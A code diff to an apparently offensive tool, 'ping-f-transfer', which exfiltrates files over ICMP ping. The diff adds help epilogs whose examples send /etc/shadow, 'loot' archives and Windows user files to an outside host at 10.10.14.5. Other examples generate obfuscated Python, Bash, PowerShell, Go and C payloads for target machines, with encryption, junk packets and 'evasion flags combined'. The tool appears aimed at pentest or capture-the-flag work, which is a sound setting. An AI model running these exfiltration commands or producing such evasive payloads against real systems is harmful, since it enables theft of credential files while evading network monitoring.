@@ -78,14 +78,74 @@ def add_common_args(parser):
                         help="Filename shown in the decode output instructions (purely informative, default: output_file)")
 
 
+def _epilog_transfer():
+    C = color
+    h = f"{C['GRAY']}# "
+    r = C['NC']
+    e = f"{C['CYAN']}"
+    return (
+        f"\n{C['GREEN']}examples:{r}\n"
+        f"  {h}Basic transfer{r}\n"
+        f"  {e}ping-f-transfer transfer -f '/tmp/secret.txt' -i 10.10.14.5{r}\n\n"
+        f"  {h}With delay between pings{r}\n"
+        f"  {e}ping-f-transfer transfer -f '/home/user/data.db' -i 10.10.14.5 -p 0.5{r}\n\n"
+        f"  {h}With compression + encryption{r}\n"
+        f"  {e}ping-f-transfer transfer -f '/etc/shadow' -i 10.10.14.5 --compress --encrypt --enc-passphrase 'MyP@ss'{r}\n\n"
+        f"  {h}With junk packets and random delay{r}\n"
+        f"  {e}ping-f-transfer transfer -f '/tmp/loot.zip' -i 10.10.14.5 -p 0.5 -r 0.2 --junk 3 --randomize-junk{r}\n\n"
+        f"  {h}Estimate transfer time (no packets sent){r}\n"
+        f"  {e}ping-f-transfer transfer -f '/var/log/syslog' -i 10.10.14.5 -p 0.3 --estimate-transfer-time{r}\n"
+    )
+
+
+def _epilog_generate():
+    C = color
+    h = f"{C['GRAY']}# "
+    r = C['NC']
+    e = f"{C['CYAN']}"
+    return (
+        f"\n{C['GREEN']}examples:{r}\n"
+        f"  {h}Python oneliner{r}\n"
+        f"  {e}ping-f-transfer generate -f '/tmp/secret.txt' -i 10.10.14.5 -l python{r}\n\n"
+        f"  {h}Bash with obfuscation + randomized variables{r}\n"
+        f"  {e}ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l bash --obfuscate-strings --randomize-var{r}\n\n"
+        f"  {h}PowerShell with encryption, split for easier pasting{r}\n"
+        f"  {e}ping-f-transfer generate -f 'C:\\Users\\admin\\flag.txt' -i 10.10.14.5 -l powershell --encrypt --enc-passphrase 's3cret' --split-payload 3{r}\n\n"
+        f"  {h}All evasion flags combined{r}\n"
+        f"  {e}ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l python --compress --encrypt --random-passphrase 32 --junk 2 --randomize-junk --randomize-var --obfuscate-strings{r}\n"
+    )
+
+
+def _epilog_makefile():
+    C = color
+    h = f"{C['GRAY']}# "
+    r = C['NC']
+    e = f"{C['CYAN']}"
+    return (
+        f"\n{C['GREEN']}examples:{r}\n"
+        f"  {h}Bash standalone script{r}\n"
+        f"  {e}ping-f-transfer makefile -f '/tmp/loot.tar.gz' -i 10.10.14.5 -l bash{r}\n\n"
+        f"  {h}Go binary for Linux{r}\n"
+        f"  {e}ping-f-transfer makefile -f '/tmp/data.bin' -i 10.10.14.5 -l go --create-script-for linux{r}\n\n"
+        f"  {h}C binary for Windows with encryption{r}\n"
+        f"  {e}ping-f-transfer makefile -f 'C:\\Users\\admin\\data.zip' -i 10.10.14.5 -l c --create-script-for windows --encrypt --enc-passphrase 'hunter2'{r}\n\n"
+        f"  {h}Python with all flags{r}\n"
+        f"  {e}ping-f-transfer makefile -f '/etc/shadow' -i 10.10.14.5 -l python --compress --encrypt --random-passphrase 32 --junk 3 --randomize-junk --randomize-var --obfuscate-strings{r}\n"
+    )
+
+
 def parse_args():
     parser = argparse.ArgumentParser(description="Send a file with ping, one echo request per chunk.")
     subparsers = parser.add_subparsers(dest="command", required=True)
 
-    transfer_p = subparsers.add_parser("transfer", help="Transfer a file using ping")
+    transfer_p = subparsers.add_parser("transfer", help="Transfer a file using ping",
+                                       epilog=_epilog_transfer(),
+                                       formatter_class=argparse.RawDescriptionHelpFormatter)
     add_common_args(transfer_p)
 
-    generate_p = subparsers.add_parser("generate", help="Generate a oneliner for the target machine")
+    generate_p = subparsers.add_parser("generate", help="Generate a oneliner for the target machine",
+                                       epilog=_epilog_generate(),
+                                       formatter_class=argparse.RawDescriptionHelpFormatter)
     add_common_args(generate_p)
     generate_p.add_argument("-l", "--language", required=True, choices=["python", "powershell", "bash", "perl", "ruby", "php", "node", "javascript"],
                             help="Language of the generated oneliner")
@@ -96,7 +156,9 @@ def parse_args():
     generate_p.add_argument("--obfuscate-strings", action="store_true",
                             help="XOR-encode sensitive strings (file path, IP, passphrase) in the generated payload")
 
-    makefile_p = subparsers.add_parser("makefile", help="Generate a standalone script file for the target machine")
+    makefile_p = subparsers.add_parser("makefile", help="Generate a standalone script file for the target machine",
+                                       epilog=_epilog_makefile(),
+                                       formatter_class=argparse.RawDescriptionHelpFormatter)
     add_common_args(makefile_p)
     makefile_p.add_argument("-l", "--language", required=True, choices=["python", "powershell", "bash", "perl", "ruby", "php", "node", "javascript", "go", "c"],
                             help="Language of the generated file")
